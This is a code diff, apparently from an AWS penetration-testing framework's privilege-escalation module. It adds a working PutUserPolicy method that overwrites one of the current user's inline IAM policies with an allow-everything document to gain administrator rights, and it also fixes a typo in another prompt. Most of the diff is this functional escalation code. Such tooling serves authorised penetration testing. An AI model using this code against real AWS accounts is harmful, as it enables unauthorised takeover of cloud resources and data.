@@ -1141,6 +1141,42 @@ def AttachRolePolicy(pacu_main, print, input, fetch_data):
 
 
 def PutUserPolicy(pacu_main, print, input, fetch_data):
+    session = pacu_main.get_active_session()
+    active_key = session.get_active_aws_key(pacu_main.database)
+
+    print('  Starting method PutUserPolicy...\n')
+
+    client = pacu_main.get_boto3_client('iam')
+
+    policy_name = input('    Is there a specific inline policy you want to modify? Enter the name now or just press enter to enumerate a list of possible policies to choose from: ')
+
+    if not policy_name:
+        inline_user_policies = []
+        for policy in active_key.policies:
+            if 'PolicyArn' not in policy:
+                # If there is no ARN, then it is inline
+                inline_user_policies.append(policy['PolicyName'])
+
+        print('Found {} inline policy(ies) attached to the current user. Choose one below.'.format(len(inline_user_policies)))
+        for i in range(0, len(inline_user_policies)):
+            print('  [{}] {}'.format(i, inline_user_policies[i]))
+        choice = input('Choose an option: ')
+        policy_name = inline_user_policies[int(choice)]
+
+    print('Targeting policy {}. Trying to turn it into an administrator policy...'.format(policy_name))
+
+    try:
+        client.put_user_policy(
+            UserName=active_key.user_name,
+            PolicyName=policy_name,
+            PolicyDocument='{"Version": "2012-10-17","Statement": [{"Effect": "Allow","Action": "*","Resource": "*"}]}'
+        )
+        print('  Successfully modified policy {}! You should now have administrator permissions.\n'.format(policy_name))
+        return True
+    except Exception as error:
+        print('  Failed to modify policy {}: {}\n'.format(policy_name, error))
+        return False
+
     return
 
 
@@ -1159,7 +1195,7 @@ def AddUserToGroup(pacu_main, print, input, fetch_data):
 
     client = pacu_main.get_boto3_client('iam')
 
-    group_name = input('    Is there a specific group you want to add your user to? Enter the name now or just press enter to enumerate a list possible groups to choose from: ')
+    group_name = input('    Is there a specific group you want to add your user to? Enter the name now or just press enter to enumerate a list of possible groups to choose from: ')
     if group_name == '':
         if fetch_data(['IAM', 'Groups'], 'enum_users_roles_policies_groups', '--groups') is False:
             print('Pre-req module not run successfully. Exiting...')
